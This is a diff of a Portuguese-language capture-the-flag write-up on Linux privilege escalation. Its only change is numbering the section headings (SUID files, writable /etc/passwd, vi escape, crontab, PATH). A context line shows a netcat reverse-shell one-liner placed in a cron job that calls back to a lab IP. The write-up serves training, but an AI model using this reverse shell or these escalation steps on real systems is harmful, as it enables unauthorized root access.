@@ -171,7 +171,7 @@ Para responder a questão ***f***, localize na saída da execução do LinEnum.s
 ```
 - g. ***Well done! Bear the results of the enumeration stage in mind as we continue to exploit the system!***: *Não há necessidade de resposta*
 
-## Abusing SUID/GUID Files
+## 5 - Abusing SUID/GUID Files
 
 Pode-se dizer que o primeiro passo para elevação de privilégios é buscar por arquivos que tenham setado o bit SUID/GUID. Esses arquivos podem permitir executar com permissões de owner/group, que por vezes, oferecem elevação de privilégios, como de superusuário.
 
@@ -292,7 +292,7 @@ Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 root@polobox:~# 
 ```
 
-## Exploiting a writable /etc/passwd
+## 6 - Exploiting a writable /etc/passwd
 
 A partir da enumeração de usuários, constata-se que o user7 é um membro do grupo root com gid 0. Sabe-se, também, pela varredura do LinEnum que o arquivo /etc/passwd é gravável para o usuário. Portanto, a partir dessa observação, conclui-se que o user7 pode editar o arquivo /etc/passwd.
 
@@ -349,7 +349,7 @@ As duas últimas questões não tem necessidade respostas, apenas passam informa
 
 É importante destacar que o cenário demonstrado, pressupõe que o ambiente já tinha sido explorado e já se tinha senha do usuário ***user7***.
 
-## Escaping vi editor
+## 7 - Escaping vi editor
 
 Nas informações desta task é informado sobre a importância da etapa de enumeração. Como medida inicial, execução do comando ***sudo -l*** para listar possíveis comandos que o usuário pode executar com algum grau de elevação de privilégios.
 
@@ -395,7 +395,7 @@ uid=0(root) gid=0(root) groups=0(root)
 # 
 ```
 
-## Exploiting Crontab
+## 8 - Exploiting Crontab
 
 ### O que é o cron?
 
@@ -469,7 +469,7 @@ echo "mkfifo /tmp/knef; nc 10.8.95.233 8888 0</tmp/knef | /bin/sh >/tmp/knef 2>&
 
 As duas últimas questões também não necessitam de respostas. É informado apenas para executar o netcat para ficar ouvindo na porta 8888 (nc -lvpn 8888) na máquina atacante e aguardar a execução cronjob, que executa a cada 5 minutos. Com isso será aberto um shell reverso para a máquina atacante.
 
-## Exploiting PATH Variable 
+## 9 - Exploiting PATH Variable 
 
 ### O que é o PATH?
 
@@ -517,7 +517,7 @@ Isso fará com que você abra um prompt bash toda vez que usar "***ls***". Se vo
 
 Depois de terminar o exploit, pode sair do root e usar "***export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH***" para redefinir a variável PATH de volta ao padrão, permitindo que se use "ls" novamente!
 
-## Expanding Your Knowledge
+## 10 - Expanding Your Knowledge
 
 Conclusão da room, esclarecendo que foram expostos alguns exemplos simples de elevação de privilégios em ambientes linux.
 
